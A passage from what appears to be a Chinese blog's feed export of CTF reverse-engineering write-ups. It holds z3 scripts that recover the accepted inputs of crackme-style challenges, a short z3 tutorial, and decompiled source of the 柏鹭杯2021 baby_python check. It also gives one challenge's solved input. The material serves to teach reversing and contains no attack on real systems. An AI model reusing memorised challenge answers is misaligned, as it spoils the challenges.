class="number">0x00</span>,<span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xa7</span>,<span class="number">0x31</span>]<span class="comment">#v7最开始进行的是v7[-1]，因为python的[-1]跟c不同，此处可以直接将其数组前移8字节，在后续访问时可以不用使用v7[-1]</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v8=[</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,<span class="number">0xa7</span>,</span><br><span class="line"><span class="number">0x31</span>,<span class="number">0xf1</span>,<span class="number">0x28</span>,<span class="number">0x84</span>,<span class="number">0xc1</span>,<span class="number">0x1e</span>,<span class="number">0x7a</span>,<span class="number">0x00</span>]<span class="comment">#直接从动态调试中取就行</span></span><br></pre></td></tr></table></figure></div>

<p>具体解密如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">v8=[</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,<span class="number">0xa7</span>,</span><br><span class="line"><span class="number">0x31</span>,<span class="number">0xf1</span>,<span class="number">0x28</span>,<span class="number">0x84</span>,<span class="number">0xc1</span>,<span class="number">0x1e</span>,<span class="number">0x7a</span>,<span class="number">0x00</span>]</span><br><span class="line">v7=[</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x07</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x1d</span>,<span class="number">0x1f</span>,<span class="number">0x21</span>,<span class="number">0x24</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x2d</span>,<span class="number">0x2f</span>,<span class="number">0x31</span>,<span class="number">0x34</span>,<span class="number">0x37</span>,<span class="number">0x3a</span>,<span class="number">0x3d</span>,</span><br><span class="line"><span class="number">0x40</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x4f</span>,<span class="number">0x52</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x22</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xa7</span>,<span class="number">0x31</span>]</span><br><span class="line">v5=[</span><br><span class="line"><span class="number">0x0A</span>,<span class="number">0x04</span>,<span class="number">0x10</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x0B</span>,<span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x01</span></span><br><span class="line">]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    out[i]=flag[i]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line">v11=<span class="number">0</span></span><br><span class="line">v10=<span class="number">0</span></span><br><span class="line">v9=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        v10=v7[v11+j]</span><br><span class="line">        <span class="keyword">match</span> v5[v10]:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                out[i]=out[i]+v5[v10+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                out[i]=out[i]-v5[v10+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                out[i]=out[i]^v5[v10+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                out[i]=out[i]*v5[v10+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                out[i]-=<span class="number">1</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                out[i]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">case</span> _:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    v11+=<span class="number">2</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    f.add(out[i]==v8[i])</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br></pre></td></tr></table></figure></div>

<p>解出来有两个解，依次输入其中试试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\5.elf.assets\image-20230107152449512.png"
                      alt="image-20230107152449512"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\5.elf.assets\image-20230107152515596.png"
                      alt="image-20230107152515596"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\5.elf.assets\image-20230107152705325.png"
                      alt="image-20230107152705325"
                ></p>
<p>上一个为正确的解：757515121f3d478</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>pythonz3</title>
    <url>/2022/12/26/CTF%20WP/Re/pythonz3/pythonz3/</url>
    <content><![CDATA[<h1 id="基本变量类型"><a href="#基本变量类型" class="headerlink" title="基本变量类型"></a>基本变量类型</h1><p>其分为整型(Int)，实型(Real)和向量(BitVec)</p>
<h2 id="整形-int"><a href="#整形-int" class="headerlink" title="整形(int)"></a>整形(int)</h2><p>不是c中具有上下限的整形而是数学意义上的整数</p>
<p>创建方式</p>
<ol>
<li>Int(name, ctx&#x3D;None)，创建一个整数变量，name是名字</li>
<li>Ints (names, ctx&#x3D;None)，创建多个整数变量，names是空格分隔名字</li>
<li>IntVal (val, ctx&#x3D;None)，创建一个整数常量，有初始值，没名字。</li>
</ol>
<h2 id="实形-real"><a href="#实形-real" class="headerlink" title="实形(real)"></a>实形(real)</h2><p>是数学意义上的实数</p>
<p>创建方式</p>
<ol>
<li>real(name, ctx&#x3D;None)，创建一个实变量，name是名字</li>
<li>reals (names, ctx&#x3D;None)，创建多个实变量，names是空格分隔名字</li>
<li>realVal (val, ctx&#x3D;None)，创建一个实常量，有初始值，没名字。</li>
</ol>
<h2 id="向量-BitVec"><a href="#向量-BitVec" class="headerlink" title="向量(BitVec)"></a>向量(BitVec)</h2><p>数学意义上的向量</p>
<p>创建方式</p>
<p>Bitvec(name,bv,ctx&#x3D;None)，创建一个位向量，name是他的名字，bv表示大小<br>BitVecs(name,bv,ctx&#x3D;None)，创建一个有多变量的位向量，name是名字，bv表示大小<br>BitVecVal(val,bv,ctx&#x3D;None)，创建一个位向量，有初始值，没名字。</p>
<h1 id="python3-11下的使用"><a href="#python3-11下的使用" class="headerlink" title="python3.11下的使用"></a>python3.11下的使用</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">x=z3.Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=z3.Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z3.solve(x&gt;<span class="number">2</span>,y&lt;<span class="number">10</span>,x+<span class="number">2</span>*y==<span class="number">7</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">[y = <span class="number">0</span>, x = <span class="number">7</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>在python3.11下使用时需使用”.”访问符访问z3</p>
<p>类似使用z3这个类中的函数以及数据类型</p>
<h1 id="具体指令"><a href="#具体指令" class="headerlink" title="具体指令"></a>具体指令</h1><ol>
<li>s&#x3D;solver()，创建一个解的对象。</li>
<li>s.add(条件)，为解增加一个限制条件</li>
<li>s.check()，检查解是否存在，如果存在，会返回”sat”</li>
<li>model()，输出解得结果</li>
</ol>
<p>5.<code>solver.assertions()</code>查看求解器已经添加的约束和约束的个数</p>
<p>在计算时需给变量约束，没有约束是计算不出结果的，同时给了约束才能进行计算。</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>柏鹭杯2021baby_python</title>
    <url>/2023/06/21/CTF%20WP/Re/pythonz3/%E6%9F%8F%E9%B9%AD%E6%9D%AF2021baby_python/</url>
    <content><![CDATA[<p>标准的pythonexe逆向，</p>
<p>唯一需要注意的是需要逆向的pyc文件在pyz文件包内</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306212353722.png"
                      alt="image-20230621235313652"
                ></p>
<p>下面是源码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: baby_core.pyc (Python 3.7)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s = <span class="literal">None</span></span>):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(s)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest().lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    secret = <span class="built_in">input</span>(<span class="string">&#x27;secret: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(secret) != <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="literal">None</span>.isnumeric():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    values = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">3</span>):</span><br><span class="line">        values.append(<span class="built_in">int</span>(secret[i:i + <span class="number">3</span>]))</span><br><span class="line">    </span><br><span class="line">    co = [</span><br><span class="line">        [</span><br><span class="line">            <span class="number">158</span>,</span><br><span class="line">            <span class="number">195</span>,</span><br><span class="line">            <span class="number">205</span>,</span><br><span class="line">            <span class="number">229</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">238</span>,</span><br><span class="line">            <span class="number">211</span>,</span><br><span class="line">            <span class="number">198</span>,</span><br><span class="line">            <span class="number">190</span>,</span><br><span class="line">            <span class="number">226</span>,</span><br><span class="line">            <span class="number">135</span>,</span><br><span class="line">            <span class="number">119</span>,</span><br><span class="line">            <span class="number">145</span>,</span><br><span class="line">            <span class="number">205</span>,</span><br><span class="line">            <span class="number">113</span>,</span><br><span class="line">            <span class="number">122</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">234</span>,</span><br><span class="line">            <span class="number">256</span>,</span><br><span class="line">            <span class="number">185</span>,</span><br><span class="line">            <span class="number">253</span>,</span><br><span class="line">            <span class="number">244</span>,</span><br><span class="line">            <span class="number">134</span>,</span><br><span class="line">            <span class="number">102</span>,</span><br><span class="line">            <span class="number">117</span>,</span><br><span class="line">            <span class="number">190</span>,</span><br><span class="line">            <span class="number">106</span>,</span><br><span class="line">            <span class="number">131</span>,</span><br><span class="line">            <span class="number">205</span>,</span><br><span class="line">            <span class="number">198</span>,</span><br><span class="line">            <span class="number">234</span>,</span><br><span class="line">            <span class="number">162</span>,</span><br><span class="line">            <span class="number">218</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">164</span>,</span><br><span class="line">            <span class="number">164</span>,</span><br><span class="line">            <span class="number">209</span>,</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="number">168</span>,</span><br><span class="line">            <span class="number">226</span>,</span><br><span class="line">            <span class="number">189</span>,</span><br><span class="line">            <span class="number">151</span>,</span><br><span class="line">            <span class="number">253</span>,</span><br><span class="line">            <span class="number">241</span>,</span><br><span class="line">            <span class="number">232</span>,</span><br><span class="line">            <span class="number">151</span>,</span><br><span class="line">            <span class="number">193</span>,</span><br><span class="line">            <span class="number">119</span>,</span><br><span class="line">            <span class="number">226</span>,</span><br><span class="line">            <span class="number">193</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">117</span>,</span><br><span class="line">            <span class="number">151</span>,</span><br><span class="line">            <span class="number">103</span>,</span><br><span class="line">            <span class="number">249</span>,</span><br><span class="line">            <span class="number">148</span>,</span><br><span class="line">            <span class="number">103</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">218</span>,</span><br><span class="line">            <span class="number">222</span>,</span><br><span class="line">            <span class="number">104</span>,</span><br><span class="line">            <span class="number">228</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">206</span>,</span><br><span class="line">            <span class="number">218</span>,</span><br><span class="line">            <span class="number">177</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">217</span>,</span><br><span class="line">            <span class="number">202</span>,</span><br><span class="line">            <span class="number">126</span>,</span><br><span class="line">            <span class="number">214</span>,</span><br><span class="line">            <span class="number">195</span>,</span><br><span class="line">            <span class="number">125</span>,</span><br><span class="line">            <span class="number">144</span>,</span><br><span class="line">            <span class="number">105</span>,</span><br><span class="line">            <span class="number">152</span>,</span><br><span class="line">            <span class="number">118</span>,</span><br><span class="line">            <span class="number">167</span>,</span><br><span class="line">            <span class="number">137</span>,</span><br><span class="line">            <span class="number">171</span>,</span><br><span class="line">            <span class="number">173</span>,</span><br><span class="line">            <span class="number">206</span>,</span><br><span class="line">            <span class="number">240</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">160</span>,</span><br><span class="line">            <span class="number">134</span>,</span><br><span class="line">            <span class="number">131</span>,</span><br><span class="line">            <span class="number">135</span>,</span><br><span class="line">            <span class="number">186</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">146</span>,</span><br><span class="line">            <span class="number">129</span>,</span><br><span class="line">            <span class="number">125</span>,</span><br><span class="line">            <span class="number">139</span>,</span><br><span class="line">            <span class="number">174</span>,</span><br><span class="line">            <span class="number">205</span>,</span><br><span class="line">            <span class="number">177</span>,</span><br><span class="line">            <span class="number">240</span>,</span><br><span class="line">            <span class="number">194</span>,</span><br><span class="line">            <span class="number">181</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">183</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">127</span>,</span><br><span class="line">            <span class="number">136</span>,</span><br><span class="line">            <span class="number">136</span>,</span><br><span class="line">            <span class="number">209</span>,</span><br><span class="line">            <span class="number">199</span>,</span><br><span class="line">            <span class="number">191</span>,</span><br><span class="line">            <span class="number">150</span>,</span><br><span class="line">            <span class="number">218</span>,</span><br><span class="line">            <span class="number">160</span>,</span><br><span class="line">            <span class="number">111</span>,</span><br><span class="line">            <span class="number">191</span>,</span><br><span class="line">            <span class="number">226</span>,</span><br><span class="line">            <span class="number">154</span>,</span><br><span class="line">            <span class="number">191</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">247</span>,</span><br><span class="line">            <span class="number">188</span>,</span><br><span class="line">            <span class="number">210</span>,</span><br><span class="line">            <span class="number">219</span>,</span><br><span class="line">            <span class="number">179</span>,</span><br><span class="line">            <span class="number">204</span>,</span><br><span class="line">            <span class="number">155</span>,</span><br><span class="line">            <span class="number">220</span>,</span><br><span class="line">            <span class="number">215</span>,</span><br><span class="line">            <span class="number">127</span>,</span><br><span class="line">            <span class="number">225</span>,</span><br><span class="line">            <span class="number">214</span>,</span><br><span class="line">            <span class="number">195</span>,</span><br><span class="line">            <span class="number">162</span>,</span><br><span class="line">            <span class="number">214</span>,</span><br><span class="line">            <span class="number">239</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">108</span>,</span><br><span class="line">            <span class="number">112</span>,</span><br><span class="line">            <span class="number">104</span>,</span><br><span class="line">            <span class="number">133</span>,</span><br><span class="line">            <span class="number">178</span>,</span><br><span class="line">            <span class="number">138</span>,</span><br><span class="line">            <span class="number">110</span>,</span><br><span class="line">            <span class="number">176</span>,</span><br><span class="line">            <span class="number">232</span>,</span><br><span class="line">            <span class="number">124</span>,</span><br><span class="line">            <span class="number">193</span>,</span><br><span class="line">            <span class="number">239</span>,</span><br><span class="line">            <span class="number">131</span>,</span><br><span class="line">            <span class="number">138</span>,</span><br><span class="line">            <span class="number">161</span>,</span><br><span class="line">            <span class="number">218</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">140</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">142</span>,</span><br><span class="line">            <span class="number">181</span>,</span><br><span class="line">            <span class="number">179</span>,</span><br><span class="line">            <span class="number">173</span>,</span><br><span class="line">            <span class="number">203</span>,</span><br><span class="line">            <span class="number">208</span>,</span><br><span class="line">            <span class="number">184</span>,</span><br><span class="line">            <span class="number">129</span>,</span><br><span class="line">            <span class="number">129</span>,</span><br><span class="line">            <span class="number">119</span>,</span><br><span class="line">            <span class="number">122</span>,</span><br><span class="line">            <span class="number">152</span>,</span><br><span class="line">            <span class="number">186</span>,</span><br><span class="line">            <span class="number">124</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">105</span>,</span><br><span class="line">            <span class="number">205</span>,</span><br><span class="line">            <span class="number">124</span>,</span><br><span class="line">            <span class="number">142</span>,</span><br><span class="line">            <span class="number">175</span>,</span><br><span class="line">            <span class="number">184</span>,</span><br><span class="line">            <span class="number">234</span>,</span><br><span class="line">            <span class="number">119</span>,</span><br><span class="line">            <span class="number">195</span>,</span><br><span class="line">            <span class="number">218</span>,</span><br><span class="line">            <span class="number">141</span>,</span><br><span class="line">            <span class="number">122</span>,</span><br><span class="line">            <span class="number">202</span>,</span><br><span class="line">            <span class="number">202</span>,</span><br><span class="line">            <span class="number">190</span>,</span><br><span class="line">            <span class="number">178</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">183</span>,</span><br><span class="line">            <span class="number">178</span>,</span><br><span class="line">            <span class="number">256</span>,</span><br><span class="line">            <span class="number">124</span>,</span><br><span class="line">            <span class="number">241</span>,</span><br><span class="line">            <span class="number">132</span>,</span><br><span class="line">            <span class="number">163</span>,</span><br><span class="line">            <span class="number">209</span>,</span><br><span class="line">            <span class="number">204</span>,</span><br><span class="line">            <span class="number">104</span>,</span><br><span class="line">            <span class="number">175</span>,</span><br><span class="line">            <span class="number">211</span>,</span><br><span class="line">            <span class="number">196</span>,</span><br><span class="line">            <span class="number">136</span>,</span><br><span class="line">            <span class="number">158</span>,</span><br><span class="line">            <span class="number">210</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">224</span>,</span><br><span class="line">            <span class="number">144</span>,</span><br><span class="line">            <span class="number">189</span>,</span><br><span class="line">            <span class="number">106</span>,</span><br><span class="line">            <span class="number">177</span>,</span><br><span class="line">            <span class="number">251</span>,</span><br><span class="line">            <span class="number">206</span>,</span><br><span class="line">            <span class="number">163</span>,</span><br><span class="line">            <span class="number">167</span>,</span><br><span class="line">            <span class="number">144</span>,</span><br><span class="line">            <span class="number">208</span>,</span><br><span class="line">            <span class="number">254</span>,</span><br><span class="line">            <span class="number">117</span>,</span><br><span class="line">            <span class="number">253</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">106</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">251</span>,</span><br><span class="line">            <span class="number">251</span>,</span><br><span class="line">            <span class="number">136</span>,</span><br><span class="line">            <span class="number">170</span>,</span><br><span class="line">            <span class="number">145</span>,</span><br><span class="line">            <span class="number">177</span>,</span><br><span class="line">            <span class="number">175</span>,</span><br><span class="line">            <span class="number">124</span>,</span><br><span class="line">            <span class="number">193</span>,</span><br><span class="line">            <span class="number">188</span>,</span><br><span class="line">            <span class="number">193</span>,</span><br><span class="line">            <span class="number">198</span>,</span><br><span class="line">            <span class="number">208</span>,</span><br><span class="line">            <span class="number">171</span>,</span><br><span class="line">            <span class="number">151</span>,</span><br><span class="line">            <span class="number">230</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">143</span>,</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="number">143</span>,</span><br><span class="line">            <span class="number">150</span>,</span><br><span class="line">            <span class="number">243</span>,</span><br><span class="line">            <span class="number">148</span>,</span><br><span class="line">            <span class="number">136</span>,</span><br><span class="line">            <span class="number">213</span>,</span><br><span class="line">            <span class="number">161</span>,</span><br><span class="line">            <span class="number">224</span>,</span><br><span class="line">            <span class="number">170</span>,</span><br><span class="line">            <span class="number">208</span>,</span><br><span class="line">            <span class="number">185</span>,</span><br><span class="line">            <span class="number">117</span>,</span><br><span class="line">            <span class="number">189</span>,</span><br><span class="line">            <span class="number">242</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">234</span>,</span><br><span class="line">            <span class="number">188</span>,</span><br><span class="line">            <span class="number">226</span>,</span><br><span class="line">            <span class="number">194</span>,</span><br><span class="line">            <span class="number">248</span>,</span><br><span class="line">            <span class="number">168</span>,</span><br><span class="line">            <span class="number">250</span>,</span><br><span class="line">            <span class="number">244</span>,</span><br><span class="line">            <span class="number">166</span>,</span><br><span class="line">            <span class="number">106</span>,</span><br><span class="line">            <span class="number">113</span>,</span><br><span class="line">            <span class="number">218</span>,</span><br><span class="line">            <span class="number">209</span>,</span><br><span class="line">            <span class="number">220</span>,</span><br><span class="line">            <span class="number">158</span>,</span><br><span class="line">            <span class="number">228</span>]]</span><br><span class="line">    r = [</span><br><span class="line">        <span class="number">472214</span>,</span><br><span class="line">        <span class="number">480121</span>,</span><br><span class="line">        <span class="number">506256</span>,</span><br><span class="line">        <span class="number">449505</span>,</span><br><span class="line">        <span class="number">433390</span>,</span><br><span class="line">        <span class="number">435414</span>,</span><br><span class="line">        <span class="number">453899</span>,</span><br><span class="line">        <span class="number">536361</span>,</span><br><span class="line">        <span class="number">423332</span>,</span><br><span class="line">        <span class="number">427624</span>,</span><br><span class="line">        <span class="number">440268</span>,</span><br><span class="line">        <span class="number">488759</span>,</span><br><span class="line">        <span class="number">469049</span>,</span><br><span class="line">        <span class="number">484574</span>,</span><br><span class="line">        <span class="number">480266</span>,</span><br><span class="line">        <span class="number">522818</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        v = <span class="number">0</span></span><br><span class="line">        str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            v += co[i][j] * values[j]</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">if</span> v != r[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;ISEC-%s&#125;&#x27;</span> % md5(secret.encode()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">flag=[Int(<span class="string">f&#x27;flag[<span class="subst">&#123;i&#125;</span>]&#x27;</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>z3脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: baby_core.pyc (Python 3.7)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s = <span class="literal">None</span></span>):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(s)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest().lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">co = [</span><br><span class="line">    [</span><br><span class="line">        <span class="number">158</span>,</span><br><span class="line">        <span class="number">195</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        <span class="number">229</span>,</span><br><span class="line">        <span class="number">213</span>,</span><br><span class="line">        <span class="number">238</span>,</span><br><span class="line">        <span class="number">211</span>,</span><br><span class="line">        <span class="number">198</span>,</span><br><span class="line">        <span class="number">190</span>,</span><br><span class="line">        <span class="number">226</span>,</span><br><span class="line">        <span class="number">135</span>,</span><br><span class="line">        <span class="number">119</span>,</span><br><span class="line">        <span class="number">145</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">122</span>],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">234</span>,</span><br><span class="line">        <span class="number">256</span>,</span><br><span class="line">        <span class="number">185</span>,</span><br><span class="line">        <span class="number">253</span>,</span><br><span class="line">        <span class="number">244</span>,</span><br><span class="line">        <span class="number">134</span>,</span><br><span class="line">        <span class="number">102</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">190</span>,</span><br><span class="line">        <span class="number">106</span>,</span><br><span class="line">        <span class="number">131</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        